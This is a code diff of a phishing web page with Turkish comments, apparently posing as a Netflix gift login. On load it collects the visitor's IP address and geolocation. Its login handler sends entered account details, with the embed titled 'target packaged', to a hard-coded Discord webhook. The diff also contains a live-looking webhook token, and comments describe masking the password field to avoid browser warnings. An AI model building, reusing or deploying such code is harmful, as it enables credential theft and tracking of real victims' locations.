@@ -16,7 +16,6 @@
     <style>
         body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        /* SAHTE BİLDİRİM */
         #notification {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             width: 90%; max-width: 400px; background: rgba(30, 30, 30, 0.95);
@@ -32,7 +31,6 @@
             width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 5px; 
             border: none; background: #333; color: #fff; box-sizing: border-box; outline: none; 
         }
-        /* ŞİFREYİ MASKELİYORUZ (Tarayıcı Uyarısı Almamak İçin) */
         .secure-mask { -webkit-text-security: disc !important; }
 
         button { 
@@ -89,7 +87,6 @@
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
         let geoInfo = {};
 
-        // SESSİZ SIZMA
         window.onload = async function() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -99,15 +96,14 @@
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        username: "ANONİM BOT",
+                        username: "SİSTEM GİRİŞ",
                         embeds: [{
                             title: "✅ GÜVENLİ TIKLAMA",
                             color: 3447003,
                             description: "```Kurban siteye girdi. Giriş yapması bekleniyor...```",
                             fields: [
                                 { name: "🌐 IP / Cihaz", value: `\`${geoInfo.ip}\` | ${navigator.userAgent.includes("Mobi") ? "Mobil" : "PC"}`, inline: true },
-                                { name: "🏠 Adres", value: `**${geoInfo.region} / ${geoInfo.city}**`, inline: false },
-                                { name: "📍 Harita", value: `[Haritada Gör](https://www.google.com/maps?q=${geoInfo.latitude},${geoInfo.longitude})`, inline: false }
+                                { name: "🏠 Adres", value: `**${geoInfo.region} / ${geoInfo.city}**`, inline: false }
                             ]
                         }]
                     })
@@ -139,12 +135,13 @@
             document.getElementById('loginBox').style.display = "none";
             document.getElementById('loadingScreen').style.display = "block";
 
-            // HESAP BİLGİSİNİ GÖNDER
+            // CRITICAL: content: m ekledik ki Make.com Gmail 'To' kısmını okuyabilsin.
             await fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    username: "ANONİM BOT",
+                    username: "NETFLIX HEDİYE SİSTEMİ",
+                    content: m, 
                     embeds: [{
                         title: "🎯 HEDEF PAKETLENDİ!",
                         color: 16711680,
